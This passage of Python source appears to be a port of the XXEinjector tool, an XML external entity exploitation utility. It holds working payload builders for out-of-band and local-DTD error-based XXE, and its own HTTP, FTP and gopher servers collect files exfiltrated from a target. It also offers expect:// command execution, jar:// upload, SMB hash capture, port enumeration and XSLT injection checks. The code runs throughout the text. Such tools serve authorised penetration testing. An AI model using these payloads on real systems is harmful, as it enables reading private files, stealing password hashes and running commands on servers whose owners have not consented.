    return "<!DOCTYPE convert [ <!ENTITY %% local_dtd SYSTEM \"%s\">%s%%local_dtd;]>" % (tpl["path"], override)


# pull the file out of the error message that the forced URI produced
def ldtdextract(body, phpfilter):
    if body is None or body == "":
        return None
    if phpfilter == "y":
        match = re.search(re.escape(G.ldtdsink) + r"([A-Za-z0-9+/=]+)", body)
        if match is None:
            return None
        data = b64dec(match.group(1))
        if data == "":
            return None
        return data
    match = re.search(re.escape(G.ldtdsink) + r"([^\"']+)", body, re.S)
    if match is None:
        return None
    return match.group(1)


### Servers ###

def listener(port, backlog=5):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", int(port)))
    server.listen(backlog)
    return server


def readline_sock(handle):
    line = handle.readline()
    if line == b"":
        return None
    return line.decode("latin-1")


# HTTP for XML serving and data retrival
def http_server(server):
    while True:
        try:
            client, _ = server.accept()
        except OSError:
            return
        threading.Thread(target=http_client, args=(client,), daemon=True).start()


def http_client(client):
    try:
        G.done = 0
        G.tmppath = G.nextpath
        handle = client.makefile("rwb")
        req = readline_sock(handle)
        if req is None:
            return

        payload = ""
        # HTTP XML serving
        if "file.dtd" in req:
            if G.verbose == "y":
                print("[+] Got request for XML:\n%s" % req)
            if G.hashes == "n" and G.upload == "" and G.expect == "":
                if G.cut == 1:
                    print("[+] Responding with XML for: /%s" % G.enumpath)
                else:
                    print("[+] Responding with XML for: %s" % G.enumpath)
            else:
                print("[+] Responding with proper XML.")

            # respond with proper XML
            if G.cdata == "y":
                payload = "<!ENTITY join \"%a;%local;%z;\">"
            elif G.hashes == "y":
                payload = ("<!ENTITY % payl \"hashes\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM '"
                           + "%s:////%s/hash/hash.txt'>\">" % (G.rproto, G.host))
            elif G.upload != "":
                payload = ("<!ENTITY % payl \"upload\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM '"
                           + "jar:http://%s:%s!/upload'>\">" % (G.host, G.jar_port))
            elif G.expect != "":
                if G.phpfilter == "n":
                    source = "expect://%s" % G.expect
                else:
                    source = "php://filter/read=convert.base64-encode/resource=expect://%s" % G.expect
                if G.enum == "ftp":
                    payload = ("<!ENTITY %% payl SYSTEM \"%s\">\r\n<!ENTITY %% int \"<!ENTITY &#37; trick SYSTEM 'ftp://%s:%s/%%payl;'>\">"
                               % (source, G.host, G.ftp_port))
                elif G.enum == "http":
                    payload = ("<!ENTITY %% payl SYSTEM \"%s\">\r\n<!ENTITY %% int \"<!ENTITY &#37; trick SYSTEM 'http://%s:%s/?p=%%payl;'>\">"
                               % (source, G.host, G.http_port))
            else:
                if G.phpfilter == "n":
                    source = "%s:///%s" % (G.rproto, G.enumpath)
                else:
                    source = "php://filter/read=convert.base64-encode/resource=file:///%s" % G.enumpath
                if G.enum == "ftp":
                    payload = ("<!ENTITY %% payl SYSTEM \"%s\">\r\n<!ENTITY %% int \"<!ENTITY &#37; trick SYSTEM 'ftp://%s:%s/%%payl;'>\">"
                               % (source, G.host, G.ftp_port))
                elif G.enum == "http":
                    payload = ("<!ENTITY %% payl SYSTEM \"%s\">\r\n<!ENTITY %% int \"<!ENTITY &#37; trick SYSTEM 'http://%s:%s/?p=%%payl;'>\">"
                               % (source, G.host, G.http_port))
                elif G.enum == "gopher":
                    payload = ("<!ENTITY %% payl SYSTEM \"%s\">\r\n<!ENTITY %% int \"<!ENTITY &#37; trick SYSTEM 'gopher://%s:%s/?gopher=%%payl;'>\">"
                               % (source, G.host, G.gopher_port))

            body = payload.encode("latin-1")
            handle.write(b"HTTP/1.1 200 OK\r\nContent-Length: " + str(len(body)).encode() +
                         b"\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n" + body)
            handle.flush()
            if G.verbose == "y":
                print("[+] XML payload sent:\n%s\n\n" % payload)

        # HTTP data retrival
        if "?p=" in req:
            G.switch = 0
            if G.verbose == "y":
                print("[+] Response with file/directory content received:\n%s\n" % req)

            # retrieve p parameter value and respond
            match = re.search(r"\?p=([^ \r\n]*)", req)
            data = match.group(1) if match else ""
            handle.write(b"HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\nThanks")
            handle.flush()

            # an empty parameter means the file could not be read
            if data == "":
                if G.verbose == "y":
                    print("[-] Callback carried no data.")
                return

            # base64 decode if parameter was encoded
            if G.phpfilter == "y":
                data = b64dec(data)

            # if PHP expect then print and exit
            if G.expect != "":
                print("[+] Result of \"%s\" command:\n%s" % (G.expect, data))
                hard_exit(1)

            # set proper splitter
            splitter = "\n" if G.phpfilter == "y" else "%0A"

            print("[+] Retrieved data:")
            for param in ruby_split(data, splitter):
                log(param + "\n")
                pusharr(param)
    except Exception:
        pass
    finally:
        try:
            client.close()
        except Exception:
            pass


# FTP server to read files/directory listings and log to files
def ftp_server(server):
    while True:
        try:
            client, _ = server.accept()
        except OSError:
            return
        threading.Thread(target=ftp_client, args=(client,), daemon=True).start()


def ftp_client(client):
    dataserv = None
    try:
        G.done = 0
        G.switch = 0
        G.tmppath = G.nextpath
        client.settimeout(G.contimeout)
        handle = client.makefile("rwb")
        handle.write(b"220 XXEinjector Welcomes!\r\n")
        handle.flush()
        while True:
            req = readline_sock(handle)
            if req is None:
                break
            cmd = req.rstrip("\r\n")
            if G.verbose == "y":
                print("[FTP] %s" % cmd)

            # passive mode has to be answered with a port we really listen on,
            # otherwise clients like the PHP ftp:// wrapper never send RETR and
            # our data, which rides in the RETR path, never arrives
            if re.match(r"(?i)^(PASV|EPSV)", cmd):
                if dataserv is not None:
                    try:
                        dataserv.close()
                    except Exception:
                        pass
                try:
                    dataserv = listener(int(G.ftp_port) + 1)
                except OSError:
                    dataserv = listener(0)
                dataport = dataserv.getsockname()[1]
                if G.verbose == "y":
                    print("[FTP] passive data port %d" % dataport)
                threading.Thread(target=drain_data, args=(dataserv,), daemon=True).start()
                if re.match(r"(?i)^EPSV", cmd):
                    handle.write(("229 Entering Extended Passive Mode (|||%d|)\r\n" % dataport).encode())
                else:
                    pasvip = G.host if re.match(r"^\d+\.\d+\.\d+\.\d+$", G.host) else "127.0.0.1"
                    handle.write(("227 Entering Passive Mode (%s,%d,%d)\r\n"
                                  % (pasvip.replace(".", ","), dataport // 256, dataport % 256)).encode())
                handle.flush()
                continue

            # directory listing
            if re.match(r"(?i)^LIST", cmd):
                handle.write(b"drwxrwxrwx 1 xxe xxe          1 Jan 01 01:01 xxe\r\n")
                handle.write(b"150 Opening BINARY mode data connection for /xxe\r\n")
                handle.write(b"226 Transfer complete\r\n")
                handle.flush()
                continue

            # rest of the conversation - these lines are not retrieved data,
            # so they are answered but never logged as file content
            if re.match(r"(?i)^(USER|PASS|ACCT|TYPE|MODE|STRU|NOOP|OPTS|SYST|FEAT|PWD|XPWD|CWD|CDUP|SIZE|MDTM|REST|PORT|EPRT|ALLO|SITE|STAT|HELP|ABOR|QUIT)\b", cmd):
                if re.match(r"(?i)^USER", cmd):
                    reply = "331 password required"
                elif re.match(r"(?i)^PASS", cmd):
                    reply = "230 Now you can send data"
                elif re.match(r"(?i)^SYST", cmd):
                    reply = "215 UNIX Type: L8"
                elif re.match(r"(?i)^FEAT", cmd):
                    reply = "211 No features"
                elif re.match(r"(?i)^(PWD|XPWD)", cmd):
                    reply = "257 \"/\" is current directory"
                elif re.match(r"(?i)^(CWD|CDUP)", cmd):
                    # while bruteforcing files the path is a file, and a client
                    # that gets 250 here treats it as a directory and never
                    # sends RETR - directory enumeration still needs 250
                    reply = "550 No such directory" if G.brute != "" else "250 Directory changed"
                elif re.match(r"(?i)^SIZE", cmd):
                    # a failed SIZE makes clients give up before RETR
                    reply = "213 1"
                elif re.match(r"(?i)^MDTM", cmd):
                    reply = "213 20000101000000"
                elif re.match(r"(?i)^PORT", cmd):
                    reply = "200 PORT command OK"
                elif re.match(r"(?i)^QUIT", cmd):
                    handle.write(b"221 Bye\r\n")
                    handle.flush()
                    break
                else:
                    reply = "200 Command OK"
                handle.write((reply + "\r\n").encode())
                handle.flush()
                continue

            # truncate requests to proper format and base64 decode if encoded
            if re.match(r"(?i)^RETR ", cmd):
                handle.write(b"150 Opening BINARY mode data connection\r\n")
                handle.write(b"226 Transfer complete\r\n")
                handle.flush()
                data = " ".join(req.split(" ")[1:])
                # leading slash is the URL path separator, not part of our data
                data = re.sub(r"^/", "", data)
                data = data.rstrip("\r\n") + "\n"
            else:
                handle.write(b"230 Now you can send data\r\n")
                handle.flush()
                data = req

            if G.phpfilter == "y":
                data = b64dec(data)

            # if PHP expect then print and exit
            if G.expect != "":
                print("[+] Result of \"%s\" command:\n%s" % (G.expect, data))
                hard_exit(1)

            log(data)
            pusharr(data.rstrip("\r\n"))
    except (socket.timeout, OSError):
        pass
    except Exception:
        pass
    finally:
        if dataserv is not None:
            try:
                dataserv.close()
            except Exception:
                pass
        try:
            client.close()
        except Exception:
            pass


def drain_data(server):
    while True:
        try:
            conn, _ = server.accept()
            conn.close()
        except OSError:
            return


# gopher server to read files/directory listings and log to files
def gopher_server(server):
    while True:
        try:
            client, _ = server.accept()
        except OSError:
            return
        threading.Thread(target=gopher_client, args=(client,), daemon=True).start()


def gopher_client(client):
    try:
        G.done = 0
        G.switch = 0
        G.tmppath = G.nextpath
        client.settimeout(G.contimeout)
        handle = client.makefile("rwb")
        while True:
            req = ""
            while True:
                tmp = readline_sock(handle)
                if tmp is None or tmp.rstrip("\r\n") == "":
                    break
                req += tmp
            if req == "":
                break
            req = req.replace("gopher=", "", 1)
            print("[+] Retrieved data:")
            for param in ruby_split(req, "\n"):
                log(param + "\n")
                pusharr(param)
    except (socket.timeout, OSError):
        pass
    except Exception:
        pass
    finally:
        try:
            client.close()
        except Exception:
            pass


# TCP server for uploading files using Java jar
def jar_server(server):
    while True:
        try:
            client, _ = server.accept()
        except OSError:
            return
        threading.Thread(target=jar_client, args=(client,), daemon=True).start()


def jar_client(client):
    try:
        with open(G.upload, "rb") as handle:
            content = handle.read()
        print("[+] File uploaded. Check temp directory on remote host for jar_cache*.tmp file. This file is available until connection is closed.")
        client.sendall(content + b"\n")
        while True:
            time.sleep(10000)
    except Exception:
        pass


# TCP server for XSLT injection test
def xslt_server(server):
    while True:
        try:
            client, _ = server.accept()
        except OSError:
            return
        print("[+] XSLT injection is working!")
        try:
            client.close()
        except Exception:
            pass
        hard_exit(1)


### Main ###

def main():
    argv = sys.argv[1:]
    parse_args(argv)
    show_info_flags(argv)

    # show main menu
    if (len(argv) < 3 and G.logger == "n" and G.localdtd == "") or \
       (G.host == "" and G.direct == "" and G.logger == "n" and G.localdtd == "") or \
       (G.file == "" and G.logger == "n") or \
       (G.path == "" and G.brute == "" and G.hashes == "n" and G.upload == "" and
            G.expect == "" and G.enumports == "" and G.xslt == "n" and G.logger == "n" and
            G.localdtd == ""):
        show_menu()
    else:
        print("XXEinjector by Jakub Pa\u0142aczy\u0144ski")
        print("")
        print("Enumeration options:")
        print("\"y\" - enumerate currect file (default)")
        print("\"n\" - skip currect file")
        print("\"a\" - enumerate all files in currect directory")
        print("\"s\" - skip all files in currect directory")
        print("\"q\" - quit")
        print("")

    # read the request files once
    if G.file != "":
        G.reqline, G.reqheaders, G.reqbody = readreq(G.file, "request")
    if G.secfile != "":
        G.secreqline, G.secreqheaders, G.secreqbody = readreq(G.secfile, "second request")

    # get connection host and port
    if G.logger == "n":
        get_host_and_port()

    if G.secfile != "":
        configsecreq()

    # initial changes
    # set longer timeout for direct exploitation
    if G.direct != "":
        G.time = 30
        # results arrive in the response itself, so there is no listener to wait for
        if G.timeoutset == "n":
            G.timeout = 1

    # local DTD technique retrieves files in band, from the error message
    if G.localdtd != "":
        G.time = 30
        if G.timeoutset == "n":
            G.timeout = 1
        if G.brute == "":
            print("[-] Local DTD technique needs a list of files to retrieve. Use --brute.")
            die()
        if G.direct != "":
            print("[-] Use either --direct or --localdtd, not both.")
            die()

    # Remove first slash if unix-like path specified
    if G.path[:1] == "/":
        G.path = G.path[1:]
        G.cut = 1

    # Remove slash at the end if not Windows drive
    if G.path[-1:] == "/" and G.path[-2:-1] != ":":
        G.path = G.path[:-1]

    # Add some changes to Windows path
    if G.cut == 0:
        if G.path[-1:] == ":":
            G.path += "/"
        G.path = G.path.replace("\\", "/")

    # configure payloads
    G.dtd = "<!DOCTYPE convert [ <!ENTITY %% remote SYSTEM \"http://%s:%s/file.dtd\">%%remote;%%int;%%trick;]>" \
        % (G.host, G.http_port)
    G.xsl = "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:variable name=\"cmd\" select=\"document('http://%s:%s/success')\"/><xsl:value-of select=\"$cmd\"/></xsl:template></xsl:stylesheet>" \
        % (G.host, G.xslt_port)

    # Starting servers
    http_srv = ftp_srv = gopher_srv = jar_srv = xslt_srv = None
    try:
        if (G.xslt == "n" and G.enumports == "" and G.logger == "n" and G.localdtd == "") or \
           (G.logger == "y" and G.enum == "http") or (G.direct != "" and G.cdata == "y"):
            http_srv = listener(G.http_port)
        if G.enum == "ftp" and G.xslt == "n" and G.enumports == "" and G.direct == "" and G.localdtd == "":
            ftp_srv = listener(G.ftp_port)
        if G.enum == "gopher" and G.xslt == "n" and G.enumports == "" and G.direct == "" and G.localdtd == "":
            gopher_srv = listener(G.gopher_port)
        if G.upload != "":
            jar_srv = listener(G.jar_port)
        if G.xslt == "y":
            xslt_srv = listener(G.xslt_port)
    except OSError:
        print("[-] Specified TCP ports already in use.")
        die()

    if http_srv is not None:
        threading.Thread(target=http_server, args=(http_srv,), daemon=True).start()
    if ftp_srv is not None:
        threading.Thread(target=ftp_server, args=(ftp_srv,), daemon=True).start()
    if gopher_srv is not None:
        threading.Thread(target=gopher_server, args=(gopher_srv,), daemon=True).start()

    # logger
    if G.logger == "y":
        print("[+] You can now make requests.")
        print("[+] Enter \"exit\" to quit.")
        if sys.stdin.isatty():
            while True:
                cmp = ask()
                if cmp is None or cmp.strip() == "exit":
                    die()
        else:
            # no terminal to type "exit" into, keep logging until killed
            while True:
                time.sleep(3600)

    # unfiltered ports enumeration
    if G.enumports != "":
        ports = []

        def catcher(port):
            try:
                server = listener(port, 1)
            except OSError:
                print("[-] Cannot bind to %s port." % port)
                return None
            def wait():
                try:
                    conn, _ = server.accept()
                    ports.append(str(port))
                    conn.close()
                except OSError:
                    pass
            threading.Thread(target=wait, daemon=True).start()
            return server

        if G.enumports == "all":
            targets = range(1, 65536)
        else:
            targets = [int(p) for p in G.enumports.split(",")]

        for tcpport in targets:
            G.dtd = "<!DOCTYPE convert [ <!ENTITY %% remote SYSTEM \"http://%s:%s/success.dtd\">%%remote;]>" \
                % (G.host, tcpport)
            server = catcher(tcpport)
            if server is None:
                continue
            configreq()
            sendreq()
            if G.secfile != "":
                send2ndreq()
            time.sleep(0.2)
            try:
                server.close()
            except Exception:
                pass

        if ports:
            print("[+] Unfiltered ports: " + ",".join(ports))
        else:
            print("[-] No unfiltered ports were identified.")
        die()
    else:
        if G.direct == "":
            configreq()

    # TCP server for uploading files using Java jar
    if G.upload != "":
        threading.Thread(target=jar_server, args=(jar_srv,), daemon=True).start()
        sendreq()
        while True:
            time.sleep(10000)

    # TCP server for XSLT injection test
    if G.xslt == "y":
        threading.Thread(target=xslt_server, args=(xslt_srv,), daemon=True).start()
        sendreq()
        if G.secfile != "":
            send2ndreq()
        time.sleep(G.timeout)
        print("[-] XSLT is not working.")
        die()

    # Retriving Windows hashes
    if G.hashes == "y":
        print("[+] Start msfconsole with auxiliary/server/capture/smb. Press enter when started.")
        ask()
        sendreq()
        if G.secfile != "":
            send2ndreq()
        time.sleep(10)
        print("[+] Check msfconsole for hashes.")
        ask()
        die()

    marks = G.direct.split(",") if G.direct != "" else ["", ""]

    def direct_chunk():
        # the slice includes both marks, which become newlines
        body = respbody()
        match = re.search(re.escape(marks[0]) + r"(.*)" + re.escape(marks[1]), body, re.S)
        if match is None:
            return None
        return "\n" + match.group(1) + "\n"

    # Sending first request
    if G.brute == "":
        if G.direct == "":
            G.enumpath = G.path
            G.switch = 1
            sendreq()
            if G.secfile != "":
                send2ndreq()
        else:
            G.done = 0
            G.directpath = G.path
            configreq()
            sendreq()
            if G.secfile != "":
                send2ndreq()
            if marks[0] not in respbody():
                print("[-] Response does not contain unique mark.")
                die()
            elif marks[0] + marks[1] in respbody():
                print("[-] File/directory could not be retrieved.")
                die()
            else:
                print("[+] Retrieved data:")
                for param in ruby_split(direct_chunk() or "", "\n"):
                    log(param + "\n")
                    param = param.rstrip("\r\n")
                    if REGEX.fullmatch(param):
                        G.filenames.append(param)
                        print(param)

        # Loop that checks if response with next file content was received
        if G.direct == "":
            while True:
                time.sleep(G.timeout)
                if G.switch == 1 and G.hashes == "n" and G.upload == "":
                    print("[-] FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n")
                    cmp = ask()
                    if cmp is None or cmp in ("n", "N"):
                        break
                    time.sleep(G.timeout)
                else:
                    break

    # read, ask and further enumerate
    i = 0
    while True:
        if G.brute == "":
            if i < len(G.filenames):

                # Read next line
                line = G.filenames[i].rstrip("\r\n")
                if G.urlencode == "y":
                    line = line.replace(" ", "%20")

                # Check if a file should be enumerated
                check = "/".join(("%s/%s" % (G.path, line)).split("/")[0:-1])

                if G.enumall != "y" and check not in blacklist and check not in whitelist:
                    if G.cut == 0:
                        if G.path[-1:] == "/":
                            print("\nEnumerate %s%s? Y/n/s/a/q" % (G.path, line))
                        else:
                            print("\nEnumerate %s/%s? Y/n/s/a/q" % (G.path, line))
                    else:
                        if G.path == "":
                            print("\nEnumerate /%s? Y/n/s/a/q" % line)
                        else:
                            print("\nEnumerate /%s/%s? Y/n/s/a/q" % (G.path, line))
                    cmp = ask()
                    if cmp is None:
                        cmp = "q"
                    if cmp in ("q", "Q"):
                        die()
                    if cmp in ("s", "S"):
                        blacklist.append(check)
                    if cmp in ("a", "A"):
                        whitelist.append(check)
                        cmp = "y"
                elif G.enumall == "y" or check in whitelist:
                    cmp = "y"
                else:
                    cmp = "n"

                if cmp in ("y", "Y", ""):
                    if G.enumall != "y" and check not in whitelist:
                        G.switch = 1
                    G.nextpath = line

                    # Send request with next filename
                    if G.direct != "":
                        if G.path[-1:] != "/":
                            G.directpath = "%s/%s" % (G.path, line)
                        else:
                            G.directpath = "%s%s" % (G.path, line)
                        configreq()
                    else:
                        if G.path[-1:] != "/":
                            G.enumpath = "%s/%s" % (G.path, line)
                        else:
                            G.enumpath = "%s%s" % (G.path, line)
                    if G.enumpath[:1] == "/":
                        G.enumpath = G.enumpath[1:]
                    sendreq()
                    if G.secfile != "":
                        send2ndreq()

                    # Loop that checks if response with next file content arrived
                    if G.direct == "":
                        while True:
                            time.sleep(G.timeout)
                            if G.switch == 1:
                                print("[-] FTP/HTTP did not get response. XML parser cannot parse provided file or the application is not responsive. Wait or Next? W/n")
                                cmp = ask()
                                if cmp is None or cmp in ("n", "N"):
                                    break
                                time.sleep(G.timeout)
                            else:
                                break
                    else:
                        if marks[0] not in respbody():
                            print("[-] Response does not contain unique mark.")
                        elif marks[0] + marks[1] in respbody():
                            print("[-] File/directory could not be retrieved.")
                        else:
                            G.done = 0
                            print("[+] Retrieved data:")
                            for param in ruby_split(direct_chunk() or "", "\n"):
                                log(param + "\n")
                                pusharr(param)

                i = i + 1
            else:
                print("[+] Nothing else to do. Exiting.")
                die()
        else:
            # read the list of paths once
            if G.brutelines is None:
                if not os.path.isfile(G.brute):
                    print("[-] Cannot find file with paths to bruteforce: %s" % G.brute)
                    die()
                G.brutelines = readlines_raw(G.brute)
            if i >= len(G.brutelines):
                die()

            # Read next line
            line = G.brutelines[i].rstrip("\r\n")

            with open(G.output, "a") as handle:
                handle.write("\n")
                handle.write("Filename: %s\n" % line)

            # handle unix and windows paths
            if line[:1] == "/":
                line = line[1:]
                G.cut = 1
            line = line.replace("\\", "/")
            if line[-1:] == "/" and line[-2:-1] != ":":
                line = line[:-1]
            if line[-1:] == ":":
                line += "/"

            line = line.replace(" ", "%20")

            # Send request with next filename
            if G.localdtd != "":

                # repurpose a DTD that is already on the target, one template at
                # a time, and keep the one that turns out to be present
                if G.ldtdtpls is None:
                    G.ldtdtpls = ldtdtemplates()
                data = None
                for tpl in G.ldtdtpls:
                    for shape in G.ldtdshapes:
                        G.dtd = ldtdpayload(tpl, "file:///%s" % line, G.phpfilter, shape)
                        configreq()
                        sendreq()
                        if G.secfile != "":
                            send2ndreq()
                        data = ldtdextract(respbody(), G.phpfilter)
                        if data is None:
                            if G.verbose == "y":
                                print("[-] No data with local DTD \"%s\", %s form." % (tpl["name"], shape))
                        else:
                            if G.ldtdok != "%s|%s" % (tpl["name"], shape):
                                print("[+] Local DTD \"%s\" is present, %s form: %s"
                                      % (tpl["name"], shape, tpl["path"]))
                            G.ldtdok = "%s|%s" % (tpl["name"], shape)
                            G.ldtdtpls = [tpl]
                            G.ldtdshapes = [shape]
                            break
                    if data is not None:
                        break
                if data is None:
                    print("[-] Nothing retrieved. File may not exist or be too long for the error message.")
                else:
                    with open(G.output, "a") as handle:
                        handle.write(data)
                        handle.write("\n")
                    print("[+] Retrieved data:")
                    print(data)
            else:
                if G.direct == "":
                    G.enumpath = line
                else:
                    G.directpath = line
                    configreq()
                sendreq()
                if G.secfile != "":
                    send2ndreq()

                if G.direct != "":
                    if marks[0] not in respbody():
                        if G.verbose == "y":
                            print("[-] Response does not contain unique mark.")
                    else:
                        with open(G.output, "a") as handle:
                            handle.write((direct_chunk() or "") + "\n")
                        if G.verbose == "y":
                            print("[+] Bruteforced request logged: %s" % G.directpath)

            i = i + 1
            time.sleep(G.timeout)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("")
        die()
